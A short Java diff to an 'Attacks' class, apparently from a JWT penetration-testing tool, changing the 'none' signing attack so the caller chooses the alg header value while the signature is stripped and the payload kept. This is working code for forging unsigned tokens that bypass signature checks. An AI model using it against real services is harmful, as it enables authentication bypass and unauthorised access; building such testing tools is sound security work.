@@ -76,10 +76,12 @@ public class Attacks {
      * Remove the signature from a JWS
      *
      * @param jws the JWS to use for the attack
+     * @param algorithm value to use for the algorithm
      * @return the modified JWS
      */
-    public static JWS noneSigning(JWS jws){
-        Base64URL header = Base64URL.encode("{\"typ\":\"JWT\",\"alg\":\"none\"}"); //NON-NLS
+    public static JWS noneSigning(JWS jws, String algorithm){
+        String decodedHeader = String.format("{\"typ\":\"JWT\",\"alg\":\"%s\"}", algorithm); //NON-NLS
+        Base64URL header = Base64URL.encode(decodedHeader);
         return new JWS(header, jws.getEncodedPayload(), Base64URL.encode(new byte[0]));
     }
 
